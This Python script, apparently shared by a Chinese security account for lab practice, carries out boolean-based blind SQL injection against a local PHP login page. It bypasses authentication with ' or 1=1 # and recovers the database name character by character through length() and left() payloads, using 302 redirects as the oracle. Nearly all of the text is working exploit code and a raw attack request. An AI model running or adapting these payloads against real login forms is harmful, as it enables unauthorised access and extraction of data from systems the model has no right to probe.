# -*- encoding: utf-8 -*-
# 微信公众号：乌鸦安全
# 个人微信：liuxw7

import re 
import requests

'''
POST /index.php?page=login.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://127.0.0.1
DNT: 1
Connection: close
Referer: http://127.0.0.1/index.php?page=login.php&popUpNotificationCode=LOU1
Cookie: PHPSESSID=mt2rqlcc1187ou06j2qvhpuu74; showhints=1
Upgrade-Insecure-Requests: 1

username=%27+or+1%3D1+%23&password=&login-php-submit-button=Login
username=' or 1=1 #&password=&login-php-submit-button=Login

username=admin&password=adminpass
select * form accounts where username='a' or 1=1 #
'''

url = 'http://127.0.0.1/index.php?page=login.php'
headers = {
    # 'Host':'127.0.0.1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:82.0) Gecko/20100101 Firefox/82.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Content-Length': '65',
    'Origin': 'http://127.0.0.1',
    'Connection': 'close',
    'Referer': 'http://127.0.0.1/index.php?page=login.php&popUpNotificationCode=LOU1',
    'Cookie': 'PHPSESSID=mt2rqlcc1187ou06j2qvhpuu74; showhints=1',
    'Upgrade-Insecure-Requests': '1'
}
data = {
    'username':"admin",
    'password':'adminpass',
    'login-php-submit-button':'Login'
}
# select * from accounts where username='' or length(database())=10;

# r = requests.post(url=url, headers=headers, data=data, allow_redirects=False)
# print(r.status_code)

# 判断当前数据库的长度
def get_database_length():
    for i in range(20):
        data_database_L = {
        'username':"' or length(database())=" + str(i) + " # ",
        'password':'',
        'login-php-submit-button':'Login'
                }
        # print(data)
        r_database_length = requests.post(url=url, headers=headers, data=data_database_L, allow_redirects=False)
        # print(r_database_length.status_code)
        if r_database_length.status_code == 302:
            print('[+] current database length: {}'.format(i))
            return i 

# databse_length = get_database_length()
databse_length = 10



# left
# ' or left(database(),1)='m' #

# 获取当前数据库的名称
def get_database_name(length=10):
    database_name = ''
    for i in range(1, length + 1):
        for j in 'qwertyuioplkjhgfdsazxcvbnm0123456789':
            username = " ' or left(database(), " + str(i) +  ") = '"  + database_name + str(j) + "' # "
            # print(username)
            data_database_name = {
                'username': username,
                'password':'',
                'login-php-submit-button':'Login'
                }
            database_name_r = requests.post(url=url, headers=headers, data=data_database_name, allow_redirects=False)   
            if database_name_r.status_code == 302:
                database_name += str(j) 
                # print(database_name)
                break
    return database_name         

databse_name = get_database_name()
print(databse_name)

# 乌鸦安全
